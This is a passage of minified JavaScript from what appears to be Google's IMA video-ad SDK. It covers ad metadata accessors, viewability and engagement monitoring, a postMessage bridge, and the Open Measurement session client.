                if (0 >= c) return a.toString();
                for (var d = b.slice(0, c), e = encodeURIComponent(d), f = c; 0 < f && e.length > c;) d = b.slice(0, f--), e = encodeURIComponent(d);
                bt(a, "url", d)
            } catch (g) {}
            return a.toString()
        };
    var cA = function() {
        this.g = .01 > Math.random();
        this.h = Math.floor(4503599627370496 * Math.random())
    };
    cA.prototype.report = function(a, b, c) {
        b = void 0 === b ? {} : b;
        if (null == u.G_testRunner && (this.g || (void 0 === c ? 0 : c))) {
            b.lid = a;
            b.sdkv = ky();
            a = Wh().sort().join(",");
            jc(Zc(a)) || (b.e = a);
            b = dA(this, b);
            var d = new P("http://pagead2.googlesyndication.com/pagead/gen_204");
            Gb(b, function(e, f) {
                bt(d, f, null == e ? "" : "boolean" == typeof e ? e ? "t" : "f" : "" + e)
            }, this);
            b = aA();
            Ps(d, b.o);
            b = d.toString();
            a = d.l.get("url");
            null != a && Ic() && 2083 < b.length && (b = bA(d, a));
            Ey(b)
        }
    };
    var dA = function(a, b) {
            b.id = "ima_html5";
            var c = aA();
            b.c = a.h;
            b.domain = c.h;
            return b
        },
        eA = function() {
            return G(cA)
        };
    var fA = function(a, b, c, d, e) {
        e = void 0 === e ? "" : e;
        Wi.call(this, a);
        this.ha = b;
        this.la = c;
        this.Mb = d;
        this.Gd = e
    };
    t(fA, Wi);
    fA.prototype.toString = function() {
        return ""
    };
    var gA = function(a) {
        this.g = a
    };
    l = gA.prototype;
    l.getTotalAds = function() {
        return this.g.totalAds
    };
    l.getMaxDuration = function() {
        return this.g.maxDuration
    };
    l.getAdPosition = function() {
        return this.g.adPosition
    };
    l.getPodIndex = function() {
        return this.g.podIndex
    };
    l.getTimeOffset = function() {
        return this.g.timeOffset
    };
    l.getIsBumper = function() {
        return this.g.isBumper
    };
    gA.prototype.getIsBumper = gA.prototype.getIsBumper;
    gA.prototype.getTimeOffset = gA.prototype.getTimeOffset;
    gA.prototype.getPodIndex = gA.prototype.getPodIndex;
    gA.prototype.getAdPosition = gA.prototype.getAdPosition;
    gA.prototype.getMaxDuration = gA.prototype.getMaxDuration;
    gA.prototype.getTotalAds = gA.prototype.getTotalAds;
    var hA = function(a) {
        this.g = a
    };
    l = hA.prototype;
    l.getContent = function() {
        return this.g.content
    };
    l.getContentType = function() {
        return this.g.contentType
    };
    l.getWidth = function() {
        return this.g.size.width
    };
    l.getHeight = function() {
        return this.g.size.height
    };
    l.xd = function() {
        return this.g.adSlotId
    };
    var Ay = function(a) {
        return (a = a.g.backupCompanions) ? a.map(function(b) {
            return new hA(b)
        }) : []
    };
    hA.prototype.getAdSlotId = hA.prototype.xd;
    hA.prototype.getHeight = hA.prototype.getHeight;
    hA.prototype.getWidth = hA.prototype.getWidth;
    hA.prototype.getContentType = hA.prototype.getContentType;
    hA.prototype.getContent = hA.prototype.getContent;
    var iA = function(a, b) {
        this.h = a;
        this.g = b
    };
    iA.prototype.getAdIdValue = function() {
        return this.h
    };
    iA.prototype.getAdIdRegistry = function() {
        return this.g
    };
    iA.prototype.getAdIdRegistry = iA.prototype.getAdIdRegistry;
    iA.prototype.getAdIdValue = iA.prototype.getAdIdValue;
    var Y = function(a) {
        this.g = a
    };
    Y.prototype.getAdId = function() {
        return this.g.adId
    };
    Y.prototype.getCreativeAdId = function() {
        return this.g.creativeAdId
    };
    Y.prototype.getCreativeId = function() {
        return this.g.creativeId
    };
    var jA = function(a) {
        return a.g.adQueryId
    };
    l = Y.prototype;
    l.getAdSystem = function() {
        return this.g.adSystem
    };
    l.getAdvertiserName = function() {
        return this.g.advertiserName
    };
    l.getApiFramework = function() {
        return this.g.apiFramework
    };
    l.getWrapperAdIds = function() {
        return this.g.adWrapperIds
    };
    l.getWrapperCreativeIds = function() {
        return this.g.adWrapperCreativeIds
    };
    l.getWrapperAdSystems = function() {
        return this.g.adWrapperSystems
    };
    l.isLinear = function() {
        return this.g.linear
    };
    l.isSkippable = function() {
        return this.g.skippable
    };
    l.getContentType = function() {
        return this.g.contentType
    };
    l.Be = function() {
        return this.g.description
    };
    l.De = function() {
        return this.g.title
    };
    l.getDuration = function() {
        return this.g.duration
    };
    l.getVastMediaWidth = function() {
        return this.g.vastMediaWidth
    };
    l.getVastMediaHeight = function() {
        return this.g.vastMediaHeight
    };
    l.getWidth = function() {
        return this.g.width
    };
    l.getHeight = function() {
        return this.g.height
    };
    l.getUiElements = function() {
        return this.g.uiElements
    };
    l.getMinSuggestedDuration = function() {
        return this.g.minSuggestedDuration
    };
    l.getAdPodInfo = function() {
        return new gA(this.g.adPodInfo)
    };
    l.getCompanionAds = function(a, b, c) {
        if (!this.g.companions) return [];
        var d = this.g.companions.map(function(e) {
            return new hA(e)
        });
        return zy(new vy(new lf(a, b), c), d)
    };
    l.getTraffickingParameters = function() {
        return Iu(Zc(this.g.traffickingParameters))
    };
    l.getTraffickingParametersString = function() {
        return this.g.traffickingParameters
    };
    l.getVastMediaBitrate = function() {
        return this.g.vastMediaBitrate
    };
    l.getMediaUrl = function() {
        return this.g.mediaUrl
    };
    l.getSurveyUrl = function() {
        return this.g.surveyUrl
    };
    l.getDealId = function() {
        return this.g.dealId
    };
    l.Ee = function() {
        return (this.g.universalAdIds || []).map(function(a) {
            return new iA(a.adIdValue, a.adIdRegistry)
        })
    };
    l.getUniversalAdIdValue = function() {
        return this.g.universalAdIdValue
    };
    l.getUniversalAdIdRegistry = function() {
        return this.g.universalAdIdRegistry
    };
    l.getSkipTimeOffset = function() {
        return this.g.skipTimeOffset
    };
    l.isUiDisabled = function() {
        return this.g.disableUi
    };
    Y.prototype.isUiDisabled = Y.prototype.isUiDisabled;
    Y.prototype.getSkipTimeOffset = Y.prototype.getSkipTimeOffset;
    Y.prototype.getUniversalAdIdRegistry = Y.prototype.getUniversalAdIdRegistry;
    Y.prototype.getUniversalAdIdValue = Y.prototype.getUniversalAdIdValue;
    Y.prototype.getUniversalAdIds = Y.prototype.Ee;
    Y.prototype.getDealId = Y.prototype.getDealId;
    Y.prototype.getSurveyUrl = Y.prototype.getSurveyUrl;
    Y.prototype.getMediaUrl = Y.prototype.getMediaUrl;
    Y.prototype.getVastMediaBitrate = Y.prototype.getVastMediaBitrate;
    Y.prototype.getTraffickingParametersString = Y.prototype.getTraffickingParametersString;
    Y.prototype.getTraffickingParameters = Y.prototype.getTraffickingParameters;
    Y.prototype.getCompanionAds = Y.prototype.getCompanionAds;
    Y.prototype.getAdPodInfo = Y.prototype.getAdPodInfo;
    Y.prototype.getMinSuggestedDuration = Y.prototype.getMinSuggestedDuration;
    Y.prototype.getUiElements = Y.prototype.getUiElements;
    Y.prototype.getHeight = Y.prototype.getHeight;
    Y.prototype.getWidth = Y.prototype.getWidth;
    Y.prototype.getVastMediaHeight = Y.prototype.getVastMediaHeight;
    Y.prototype.getVastMediaWidth = Y.prototype.getVastMediaWidth;
    Y.prototype.getDuration = Y.prototype.getDuration;
    Y.prototype.getTitle = Y.prototype.De;
    Y.prototype.getDescription = Y.prototype.Be;
    Y.prototype.getContentType = Y.prototype.getContentType;
    Y.prototype.isSkippable = Y.prototype.isSkippable;
    Y.prototype.isLinear = Y.prototype.isLinear;
    Y.prototype.getWrapperAdSystems = Y.prototype.getWrapperAdSystems;
    Y.prototype.getWrapperCreativeIds = Y.prototype.getWrapperCreativeIds;
    Y.prototype.getWrapperAdIds = Y.prototype.getWrapperAdIds;
    Y.prototype.getApiFramework = Y.prototype.getApiFramework;
    Y.prototype.getAdvertiserName = Y.prototype.getAdvertiserName;
    Y.prototype.getAdSystem = Y.prototype.getAdSystem;
    Y.prototype.getCreativeId = Y.prototype.getCreativeId;
    Y.prototype.getCreativeAdId = Y.prototype.getCreativeAdId;
    Y.prototype.getAdId = Y.prototype.getAdId;
    var kA = null,
        lA = function() {
            M.call(this);
            this.g = null;
            this.D = new yu(this);
            Vi(this, this.D);
            this.h = new Map;
            this.o = new Map;
            this.l = this.A = !1;
            this.C = null
        },
        mA;
    t(lA, M);
    var nA = function() {
            null == kA && (kA = new lA);
            return kA
        },
        pr = function(a, b, c) {
            var d = {};
            d.queryId = b;
            d.viewabilityData = c;
            a.g && Dy(a.g, "activityMonitor", "viewabilityMeasurement", d)
        };
    lA.prototype.destroy = function() {
        this.D.Ua(this.g, "activityMonitor", this.G);
        this.l = !1;
        this.h.clear();
        this === mA && (mA = null)
    };
    lA.prototype.N = function() {
        this.destroy();
        M.prototype.N.call(this)
    };
    lA.prototype.init = function(a) {
        if (!this.l) {
            if (this.g = a || null) this.D.O(this.g, "activityMonitor", this.G), oA(this);
            if (!(u.ima && u.ima.video && u.ima.video.client && u.ima.video.client.tagged)) {
                y("ima.video.client.sdkTag", !0, void 0);
                var b = u.document;
                a = vf(document, "SCRIPT");
                var c = hc(cc(dc("https://s0.2mdn.net/instream/video/client.js")));
                a.src = af(c);
                cf(a);
                a.async = !0;
                a.type = "text/javascript";
                b = b.getElementsByTagName("script")[0];
                b.parentNode.insertBefore(a, b)
            }
            zl();
            G(fr).J = W.g;
            this.A = !0;
            G(fr).l = !0;
            this.C = null;
            a = G(fr);
            b = "h" == Fq(a) || "b" == Fq(a);
            c = !(N(), !1);
            b && c && (a.L = !0, a.G = new Mo);
            this.l = !0
        }
    };
    var qA = function(a) {
            if (null == a) return !1;
            if ((Cd || Ed) && null != a.webkitDisplayingFullscreen) return a.webkitDisplayingFullscreen;
            a = pA(a);
            var b = window.screen.availHeight || window.screen.height;
            return 0 >= (window.screen.availWidth || window.screen.width) - a.width && 42 >= b - a.height
        },
        pA = function(a) {
            var b = {
                left: a.offsetLeft,
                top: a.offsetTop,
                width: a.offsetWidth,
                height: a.offsetHeight
            };
            try {
                "function" === typeof a.getBoundingClientRect && Af(nf(a), a) && (b = a.getBoundingClientRect())
            } catch (c) {}
            return b
        },
        rA = function(a, b, c, d, e) {
            e =
                void 0 === e ? {} : e;
            if (a.l) {
                d && null == e.opt_osdId && (e.opt_osdId = d);
                if (a.C) return a.C(b, c, e);
                if (a = d ? a.o.get(d) : W.l) null == e.opt_fullscreen && (e.opt_fullscreen = qA(a)), null == e.opt_adElement && (e.opt_adElement = a);
                return Xk.fb(469, Xa(sr, b, c, e), void 0) || {}
            }
            return {}
        },
        sA = function(a, b) {
            var c = String(Math.floor(1E9 * Math.random()));
            a.o.set(c, b);
            if (Sh(Li)) try {
                uk(function(d) {
                    if (a.g) {
                        var e = {};
                        e.engagementString = d;
                        Dy(a.g, "activityMonitor", "engagementData", e)
                    }
                }, function() {
                    return b
                })
            } catch (d) {}
            0 != W.g && qr(G(fr), c, a);
            return c
        },
        tA = function(a, b, c) {
            if (c) a.h.get(c) == b && a.h.delete(c);
            else {
                var d = [];
                a.h.forEach(function(e, f) {
                    e == b && d.push(f)
                });
                d.forEach(a.h.delete, a.h)
            }
        },
        lr = function(a, b) {
            a = a.h.get(b);
            return "function" === typeof a ? a() : {}
        },
        oA = function(a) {
            if ("function" === typeof window.Goog_AdSense_Lidar_getUrlSignalsArray) {
                var b = {};
                b.pageSignals = window.Goog_AdSense_Lidar_getUrlSignalsArray();
                Dy(a.g, "activityMonitor", "pageSignals", b)
            }
        };
    lA.prototype.G = function(a) {
        var b = a.la,
            c = b.queryId,
            d = {},
            e = null;
        d.eventId = b.eventId;
        switch (a.ha) {
            case "getPageSignals":
                oA(this);
                break;
            case "reportVastEvent":
                e = b.vastEvent;
                a = b.osdId;
                var f = {};
                f.opt_fullscreen = b.isFullscreen;
                b.isOverlay && (f.opt_bounds = b.overlayBounds);
                d.viewabilityData = rA(this, e, c, a, f);
                Dy(this.g, "activityMonitor", "viewability", d);
                break;
            case "fetchAdTagUrl":
                c = {}, c.eventId = b.eventId, a = b.osdId, Pb(b, "isFullscreen") && (e = b.isFullscreen), Pb(b, "loggingId") && (b = b.loggingId, c.loggingId = b, eA().report(43, {
                    step: "beforeLookup",
                    logid: b,
                    time: Date.now()
                })), c.engagementString = uA(this, a, e), this.g && Dy(this.g, "activityMonitor", "engagement", c)
        }
    };
    var uA = function(a, b, c) {
        var d = b ? a.o.get(b) : W.l;
        a = {};
        null != c && (a.fullscreen = c);
        c = "";
        try {
            c = tk(function() {
                return d
            }, a)
        } catch (e) {
            c = "sdktle;" + Xc(e.name, 12) + ";" + Xc(e.message, 40)
        }
        return c
    };
    y("ima.common.getVideoMetadata", function(a) {
        return lr(nA(), a)
    }, void 0);
    y("ima.common.triggerViewabilityMeasurementUpdate", function(a, b) {
        pr(nA(), a, b)
    }, void 0);
    var vA = vd ? hc(cc(dc('javascript:""'))) : hc(cc(dc("about:blank")));
    gc(vA);
    var wA = vd ? hc(cc(dc('javascript:""'))) : hc(cc(dc("javascript:undefined")));
    gc(wA);
    var xA = function(a, b, c) {
        b = void 0 === b ? null : b;
        c = void 0 === c ? null : c;
        Wi.call(this, a);
        this.l = b;
        this.g = c
    };
    t(xA, Wi);
    xA.prototype.getAd = function() {
        return this.l
    };
    xA.prototype.getAdData = function() {
        return this.g
    };
    var yA = function() {
            this.loadVideoTimeout = 8E3;
            this.autoAlign = !0;
            this.bitrate = -1;
            this.uiElements = null;
            this.enablePreloading = this.disableClickThrough = !1;
            this.mimeTypes = null;
            this.useStyledNonLinearAds = this.useStyledLinearAds = this.useLearnMoreButton = this.restoreCustomPlaybackStateOnAdBreakComplete = !1;
            this.playAdsAfterTime = -1;
            this.useVideoAdUi = !0;
            this.disableUi = !1
        },
        zA = function(a, b) {
            var c = {};
            Object.assign(c, a);
            b && (c.disableClickThrough = !0);
            return c
        };
    yA.prototype.append = function(a) {
        if (a) {
            this.autoAlign = a.autoAlign || this.autoAlign;
            var b = ed(a.bitrate);
            "number" === typeof b && !isNaN(b) && 0 < b && (this.bitrate = b);
            this.disableClickThrough = a.disableClickThrough || this.disableClickThrough;
            this.disableUi = a.disableUi || this.disableUi;
            this.enablePreloading = a.enablePreloading || this.enablePreloading;
            a.mimeTypes && 0 != a.mimeTypes.length && (this.mimeTypes = a.mimeTypes);
            b = ed(a.playAdsAfterTime);
            "number" === typeof b && !isNaN(b) && 0 < b && (this.playAdsAfterTime = b);
            this.restoreCustomPlaybackStateOnAdBreakComplete =
                a.restoreCustomPlaybackStateOnAdBreakComplete || this.restoreCustomPlaybackStateOnAdBreakComplete;
            b = ed(a.loadVideoTimeout);
            "number" === typeof b && !isNaN(b) && 0 < b && (this.loadVideoTimeout = b);
            this.uiElements = a.uiElements || this.uiElements;
            this.useLearnMoreButton = a.useLearnMoreButton || this.useLearnMoreButton;
            this.useStyledLinearAds = a.useStyledLinearAds || this.useStyledLinearAds;
            this.useStyledNonLinearAds = a.useStyledNonLinearAds || this.useStyledNonLinearAds;
            this.useVideoAdUi = !1 === a.useVideoAdUi ? !1 : this.useVideoAdUi
        }
    };
    y("module$contents$ima$AdsRenderingSettings_AdsRenderingSettings.AUTO_SCALE", -1, void 0);
    var AA = null,
        BA = function() {
            M.call(this);
            this.g = new Ls;
            this.h = null;
            this.o = new Map;
            this.l = new yu(this);
            Vi(this, this.l);
            this.A = new Map;
            this.G = null;
            this.D = -1;
            N().l = !0;
            py()
        };
    t(BA, M);
    var CA = function() {
            null == AA && (AA = new BA);
            return AA
        },
        DA = function(a, b) {
            var c = {};
            c.queryId = a;
            c.viewabilityString = b;
            CA().dispatchEvent(new xA("measurable_impression", null, c))
        },
        EA = function(a, b) {
            var c = {};
            c.queryId = a;
            c.viewabilityString = b;
            CA().dispatchEvent(new xA("viewable_impression", null, c))
        },
        FA = function(a, b, c) {
            var d = {};
            d.queryId = a;
            d.viewabilityString = b;
            d.eventName = c;
            CA().dispatchEvent(new xA("externalActivityEvent", null, d))
        };
    BA.prototype.destroy = function() {
        this.l.Ua(this.h, "activityMonitor", this.C);
        this.h = null
    };
    BA.prototype.C = function(a) {
        var b = a.la;
        switch (a.ha) {
            case "appStateChanged":
                G(fr);
                b = b.appState;
                a = O();
                a.L != b && (a.L = b, (a = G(bp).g) && $m(a.g, !b));
                break;
            case "externalActivityEvent":
                FA(b.queryId, b.viewabilityString, b.eventName);
                break;
            case "measurableImpression":
                DA(b.queryId, b.viewabilityString);
                break;
            case "viewableImpression":
                EA(b.queryId, b.viewabilityString);
                break;
            case "engagementData":
                b = b.engagementString;
                CA().G = b;
                CA().D = Ya();
                break;
            case "viewability":
                a = b.queryId;
                var c = b.vastEvent;
                this.o.get(a) && "start" ==
                    c && this.o.get(a);
                a = b.eventId;
                clearTimeout(a);
                if (c = this.g.get(a)) Os(this.g, a), c(b.viewabilityData);
                break;
            case "viewabilityMeasurement":
                G(fr);
                N();
                break;
            case "engagement":
                a = b.eventId;
                clearTimeout(a);
                c = this.g.get(a);
                if (eA().g) {
                    var d = -1;
                    this.H && (d = Ya() - this.H);
                    var e = !1;
                    c || (e = !0);
                    Pb(b, "loggingId") && eA().report(43, {
                        step: "receivedResponse",
                        time: Ya(),
                        timeout: e,
                        logid: b.loggingId,
                        timediff: d
                    })
                }
                c && (Os(this.g, a), c(b.engagementString))
        }
    };
    y("ima.bridge.getNativeViewability", function(a, b) {
        CA();
        b({})
    }, void 0);
    y("ima.bridge.getVideoMetadata", function(a) {
        return (a = CA().A.get(a)) ? a() : {}
    }, void 0);
    y("ima.bridge.triggerViewEvent", EA, void 0);
    y("ima.bridge.triggerMeasurableEvent", DA, void 0);
    y("ima.bridge.triggerExternalActivityEvent", FA, void 0);
    Object.entries({
        "application/dash+xml": 1,
        "application/x-javascript": 2,
        "application/x-mpegurl": 3,
        "application/javascript": 4,
        "audio/ogg": 5,
        "audio/mp4": 6,
        "audio/mpeg": 7,
        "audio/wav": 8,
        "text/javascript": 9,
        "video/m4v": 10,
        "video/ogg": 11,
        "video/x-flv": 12,
        "video/3gpp": 13,
        "video/mpt2": 14,
        "video/mp4": 15,
        "video/mpeg": 16,
        "video/quicktime": 17,
        "video/webm": 18
    });

    function GA(a, b) {
        return b instanceof RegExp ? "__REGEXP" + b.toString() : b
    }

    function HA(a, b) {
        return b && 0 == b.toString().indexOf("__REGEXP") ? (a = b.split("__REGEXP")[1].match(/\/(.*)\/(.*)?/), new RegExp(a[1], a[2] || "")) : b
    }
    var IA = function(a, b) {
        Cy.call(this, b);
        this.A = a;
        this.g = null;
        this.C = new yu(this);
        this.C.O(E(), "message", this.D)
    };
    t(IA, Cy);
    var JA = function(a) {
        if (null == a || "string" !== typeof a || 0 != a.lastIndexOf("ima://", 0)) return null;
        a = a.substr(6);
        try {
            return JSON.parse(a, HA)
        } catch (b) {
            return null
        }
    };
    IA.prototype.sendMessage = function(a, b, c) {
        if (null != this.g && null != this.g.postMessage) {
            var d = this.g,
                e = d.postMessage,
                f = {};
            f.name = a;
            f.type = b;
            null != c && (f.data = c);
            f.sid = this.h;
            f.channel = this.A;
            a = "ima://" + Hh(new Fh(GA), f);
            e.call(d, a, "*")
        }
        null != this.g && null == this.g.postMessage && eA().report(11)
    };
    IA.prototype.N = function() {
        Ti(this.C);
        this.g = null;
        Cy.prototype.N.call(this)
    };
    IA.prototype.D = function(a) {
        a = a.g;
        var b = JA(a.data);
        if (KA(this, b)) {
            if (null == this.g) this.g = a.source, this.l || this.connect();
            else if (this.g != a.source) return;
            KA(this, b) && this.dispatchEvent(new fA(b.name, b.type, b.data || {}, b.sid, a.origin))
        }
    };
    var KA = function(a, b) {
        if (null == b) return !1;
        var c = b.channel;
        if (null == c || c != a.A) return !1;
        b = b.sid;
        return null == b || "*" != a.h && b != a.h ? !1 : !0
    };
    var LA = hc(cc(dc("https://pagead2.googlesyndication.com/omsdk/releases/live/omweb-v1.js")));
    var MA = {
        LOADED: "loaded",
        tc: "start",
        FIRST_QUARTILE: "firstQuartile",
        MIDPOINT: "midpoint",
        THIRD_QUARTILE: "thirdQuartile",
        COMPLETE: "complete",
        sc: "pause",
        kd: "resume",
        bd: "bufferStart",
        $c: "bufferFinish",
        SKIPPED: "skipped",
        ne: "volumeChange",
        Lg: "playerStateChange",
        Af: "adUserInteraction"
    };

    function NA(a, b) {
        if (!b) throw Error("Value for " + a + " is undefined, null or blank.");
        if ("string" !== typeof b && !(b instanceof String)) throw Error("Value for " + a + " is not a string.");
        if ("" === b.trim()) throw Error("Value for " + a + " is empty string.");
    }

    function OA(a, b) {
        if (null == b) throw Error("Value for " + a + " is undefined or null");
    }

    function PA(a, b) {
        if (null == b) throw Error(a + " must not be null or undefined.");
        if ("number" !== typeof b || isNaN(b)) throw Error("Value for " + a + " is not a number");
    };

    function QA(a, b) {
        return a && (a[b] || (a[b] = {}))
    }

    function RA(a, b) {
        var c;
        if (c = void 0 === c ? "undefined" === typeof omidExports ? null : omidExports : c) a = a.split("."), a.slice(0, a.length - 1).reduce(QA, c)[a[a.length - 1]] = b
    };

    function SA() {
        return /\d+\.\d+\.\d+(-.*)?/.test("1.3.22-google_20210810")
    }

    function TA() {
        for (var a = ["1", "3", "22"], b = ["1", "0", "3"], c = 0; 3 > c; c++) {
            var d = parseInt(a[c], 10),
                e = parseInt(b[c], 10);
            if (d > e) break;
            else if (d < e) return !1
        }
        return !0
    };
    var UA = function(a, b, c, d) {
            this.h = a;
            this.method = b;
            this.version = c;
            this.g = d
        },
        VA = function(a) {
            return !!a && void 0 !== a.omid_message_guid && void 0 !== a.omid_message_method && void 0 !== a.omid_message_version && "string" === typeof a.omid_message_guid && "string" === typeof a.omid_message_method && "string" === typeof a.omid_message_version && (void 0 === a.omid_message_args || void 0 !== a.omid_message_args)
        },
        WA = function(a) {
            return new UA(a.omid_message_guid, a.omid_message_method, a.omid_message_version, a.omid_message_args)
        },
        XA = function(a) {
            var b = {};
            b = (b.omid_message_guid = a.h, b.omid_message_method = a.method, b.omid_message_version = a.version, b);
            void 0 !== a.g && (b.omid_message_args = a.g);
            return b
        };
    var YA = function(a) {
        this.h = a
    };

    function ZA() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0;
            return "y" === a ? (b & 3 | 8).toString(16) : b.toString(16)
        })
    };

    function $A(a) {
        for (var b = [], c = 0; c < arguments.length; ++c) b[c - 0] = arguments[c];
        aB(function() {
            throw new(Function.prototype.bind.apply(Error, [null, "Could not complete the test successfully - "].concat(ha(b))));
        }, function() {
            return console.error.apply(console, ha(b))
        })
    }

    function aB(a, b) {
        "undefined" !== typeof jasmine && jasmine ? a() : "undefined" !== typeof console && console && console.error && b()
    };
    var bB = function(a) {
        try {
            return a.frames ? !!a.frames.omid_v1_present : !1
        } catch (b) {
            return !1
        }
    };
    var cB = function(a) {
        this.h = a;
        this.handleExportedMessage = cB.prototype.l.bind(this)
    };
    t(cB, YA);
    cB.prototype.sendMessage = function(a, b) {
        b = void 0 === b ? this.h : b;
        if (!b) throw Error("Message destination must be defined at construction time or when sending the message.");
        b.handleExportedMessage(XA(a), this)
    };
    cB.prototype.l = function(a, b) {
        VA(a) && this.g && this.g(WA(a), b)
    };
    var dB = eval("this"),
        eB = function() {
            if ("undefined" !== typeof omidGlobal && omidGlobal) return omidGlobal;
            if ("undefined" !== typeof global && global) return global;
            if ("undefined" !== typeof window && window) return window;
            if ("undefined" !== typeof dB && dB) return dB;
            throw Error("Could not determine global object context.");
        }();

    function fB(a) {
        return null != a && "undefined" !== typeof a.top && null != a.top
    }

    function gB(a) {
        if (a === eB) return !1;
        try {
            if ("undefined" === typeof a.location.hostname) return !0
        } catch (b) {
            return !0
        }
        return !1
    };
    var hB = function(a, b) {
        this.h = b = void 0 === b ? eB : b;
        var c = this;
        a.addEventListener("message", function(d) {
            if ("object" === typeof d.data) {
                var e = d.data;
                VA(e) && d.source && c.g && c.g(WA(e), d.source)
            }
        })
    };
    t(hB, YA);
    hB.prototype.sendMessage = function(a, b) {
        b = void 0 === b ? this.h : b;
        if (!b) throw Error("Message destination must be defined at construction time or when sending the message.");
        b.postMessage(XA(a), "*")
    };
    var iB = ["omid", "v1_SessionServiceCommunication"];

    function jB(a) {
        return iB.reduce(function(b, c) {
            return b && b[c]
        }, a)
    };
    RA("OmidSessionClient.Partner", function(a, b) {
        NA("Partner.name", a);
        NA("Partner.version", b);
        this.name = a;
        this.version = b
    });
    var kB = function(a, b, c, d) {
        d = void 0 === d ? "full" : d;
        NA("VerificationScriptResource.resourceUrl", a);
        this.l = a;
        this.o = b;
        this.h = c;
        this.g = d
    };
    kB.prototype.toJSON = function() {
        return {
            accessMode: this.g,
            resourceUrl: this.l,
            vendorKey: this.o,
            verificationParameters: this.h
        }
    };
    RA("OmidSessionClient.VerificationScriptResource", kB);
    RA("OmidSessionClient.Context", function(a, b, c, d) {
        c = void 0 === c ? null : c;
        d = void 0 === d ? null : d;
        OA("Context.partner", a);
        this.g = a;
        this.B = b;
        this.l = c;
        this.h = d;
        this.o = !1
    });
    var lB = {
            sessionError: "reportError"
        },
        mB = Object.keys(MA).map(function(a) {
            return MA[a]
        }),
        nB = ["impressionOccurred"],
        oB = function() {
            var a = void 0 === a ? eB : a;
            this.g = a.omidSessionInterface
        };
    oB.prototype.sendMessage = function(a, b, c) {
        "registerSessionObserver" == a && (c = [b]);
        lB[a] && (a = lB[a]);
        b = this.g;
        0 <= nB.indexOf(a) && (b = b.adEvents);
        0 <= mB.indexOf(a) && (b = b.mediaEvents);
        b = b[a];
        if (!b) throw Error("Unrecognized method name: " + a + ".");
        b.apply(null, ha(c))
    };
    var rB = function(a, b, c) {
            OA("AdSession.context", a);
            this.g = a;
            if (!b) {
                var d;
                "undefined" === typeof d && "undefined" !== typeof window && window && (d = window);
                d = fB(d) ? d : eB;
                var e = void 0 === e ? bB : e;
                a: {
                    b = q([d, fB(d) ? d.top : eB]);
                    for (var f = b.next(); !f.done; f = b.next()) {
                        b: {
                            var g = d;f = f.value;
                            var h = e;
                            if (!gB(f)) try {
                                var k = jB(f);
                                if (k) {
                                    var n = new cB(k);
                                    break b
                                }
                            } catch (m) {}
                            n = h(f) ? new hB(g, f) : null
                        }
                        if (g = n) {
                            b = g;
                            break a
                        }
                    }
                    b = null
                }
            }
            this.h = b;
            this.B = c || new oB;
            this.L = this.C = this.A = !1;
            this.I = this.o = null;
            this.l = {};
            this.h && (this.h.g = this.Fe.bind(this));
            this.wa("setClientInfo", "1.3.22-google_20210810", this.g.g.name, this.g.g.version);
            pB(this, a.B);
            (a = a.l) && this.wa("setContentUrl", a);
            qB(this)
        },
        sB = function(a, b) {
            a.sendMessage("registerSessionObserver", b)
        };
    l = rB.prototype;
    l.start = function() {
        this.wa("startSession", {
            customReferenceData: this.g.h,
            underEvaluation: this.g.o
        })
    };
    l.error = function(a, b) {
        this.wa("sessionError", a, b)
    };
    l.wa = function(a, b) {
        for (var c = [], d = 1; d < arguments.length; ++d) c[d - 1] = arguments[d];
        this.sendMessage.apply(this, [a, null].concat(ha(c)))
    };
    l.sendMessage = function(a, b, c) {
        for (var d = [], e = 2; e < arguments.length; ++e) d[e - 2] = arguments[e];
        if (this.h) e = ZA(), b && (this.l[e] = b), d = new UA(e, "SessionService." + a, "1.3.22-google_20210810", SA() && TA() ? d : JSON.stringify(d)), this.h.sendMessage(d);
        else if (null != this.B.g) try {
            this.B.sendMessage(a, b, d)
        } catch (f) {
            $A("Failed to communicate with SessionInterface with error:"), $A(f)
        }
    };
    l.Fe = function(a) {
        var b = a.method,
            c = a.h;
        a = a.g;
        if ("response" === b && this.l[c]) {
            var d = SA() && TA() ? a ? a : [] : a && "string" === typeof a ? JSON.parse(a) : [];
            this.l[c].apply(this, d)
        }
        "error" === b && window.console && $A(a)
    };
    var pB = function(a, b) {
            b && (b = b.map(function(c) {
                return c.toJSON()
            }), a.wa("injectVerificationScriptResources", b))
        },
        qB = function(a) {
            sB(a, function(b) {
                "sessionStart" === b.type && (a.L = !0, a.o = b.data.creativeType, a.I = b.data.impressionType);
                "sessionFinish" === b.type && (a.L = !1)
            })
        };
    RA("OmidSessionClient.AdSession", rB);
    var tB = function(a) {
        OA("AdEvents.adSession", a);
        try {
            if (a.A) throw Error("AdEvents already registered.");
            a.A = !0;
            a.wa("registerAdEvents");
            this.g = a
        } catch (b) {
            throw Error("AdSession already has an ad events instance registered");
        }
    };
    tB.prototype.loaded = function(a) {
        a = void 0 === a ? null : a;
        var b = this.g;
        if ("definedByJavaScript" === b.o) throw Error("Creative type has not been redefined");
        if ("definedByJavaScript" === b.I) throw Error("Impression type has not been redefined");
        a ? this.g.wa("loaded", a.toJSON()) : this.g.wa("loaded")
    };
    RA("OmidSessionClient.AdEvents", tB);
    var uB = function(a) {
        OA("MediaEvents.adSession", a);
        try {
            if (a.C) throw Error("MediaEvents already registered.");
            a.C = !0;
            a.wa("registerMediaEvents");
            this.g = a
        } catch (b) {
            throw Error("AdSession already has a media events instance registered");
        }
    };
    uB.prototype.start = function(a, b) {
        PA("MediaEvents.start.duration", a);
        PA("MediaEvents.start.mediaPlayerVolume", b);
        if (0 > b || 1 < b) throw Error("Value for MediaEvents.start.mediaPlayerVolume is outside the range [0,1]");
        this.g.wa("start", a, b)
    };
    uB.prototype.pause = function() {
        this.g.wa("pause")
    };
    uB.prototype.resume = function() {
        this.g.wa("resume")
    };
    RA("OmidSessionClient.MediaEvents", uB);
    var xB = function(a, b) {
            vB ? a.srcdoc = b : (a = a.contentWindow) && wB(a.document, b)
        },
        vB = yd && "srcdoc" in vf(document, "IFRAME"),
        wB = function(a, b) {
            a.open("text/html", "replace");
            Tc(a, vu(b));
            a.close()
        };

    function yB(a) {
        return (a = Bf(a)) && a.omidSessionInterface ? a.omidSessionInterface : null
    }

    function zB(a, b) {
        var c = xf("IFRAME", {
            name: b,
            sandbox: "allow-scripts allow-same-origin",
            style: "display: none"
        });
        a.appendChild(c);
        a = "<script src=" + LA.Fa() + ">\x3c/script>";
        b = new Promise(function(d, e) {
            c.addEventListener("load", function() {
